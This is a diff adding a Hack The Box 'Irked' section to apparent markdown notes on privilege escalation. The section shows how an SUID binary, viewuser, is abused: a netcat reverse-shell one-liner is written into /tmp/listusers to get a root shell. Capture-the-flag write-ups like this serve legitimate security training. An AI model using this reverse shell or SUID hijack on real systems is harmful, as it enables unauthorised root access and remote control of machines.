@@ -251,6 +251,37 @@ jjs> admin@mango:/home/admin$ wc -c /tmp/fieldraccoon.txt
 ```
 From this we can see that we succesfully copy the root flag into our tmp directory and are able to read it.
 
+### exploiting viewuser - hack the box irked:
+
+When we connect to the box with our shell we enumerate and find an SUID binary by the name of `viewuser by running this command:
+```bash
+find /usr/bin/ -perm -4000
+```
+This brings back `/usr/bin/viewuser`. we run the file to see what it is doing.
+```bash
+viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2018-12-19 15:14 (:0)
+djmardov pts/0        2018-12-19 15:15 (10.10.12.35)
+djmardov pts/1        2018-12-19 15:15 (10.10.15.82)
+djmardov pts/2        2018-12-19 15:15 (10.10.13.138)
+djmardov pts/4        2018-12-19 15:16 (10.10.15.233)
+djmardov pts/5        2018-12-19 15:16 (10.10.16.28)
+djmardov pts/8        2018-12-19 15:17 (10.10.15.147)
+djmardov pts/10       2018-12-19 15:22 (10.10.12.115)
+djmardov pts/11       2018-12-19 15:23 (10.10.19.221)
+sh: 1: /tmp/listusers: Permission denied
+```
+We can see here that it is looking for the file `/tmp/listusers` to execute but it cannot find it. so we will try insert malicious code into that file to hope to get execution.
+```bash
+djmardov@irked:/tmp$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f" > /tmp/listusers
+djmardov@irked:/tmp$ chmod 777 listusers
+djmardov@irked:/tmp$ /usr/bin/viewuser
+```
+After this we setup our listener and get a connection with a root shell. We could also add `cat /root/root.txt` to the file or add `/bin/bash`, either option gives us the root flag its just preference wether you want a shell or not.
+
+
 ### tryhackme lazy-admin box - sudo -l - perl priv-esc
 
 ```bash
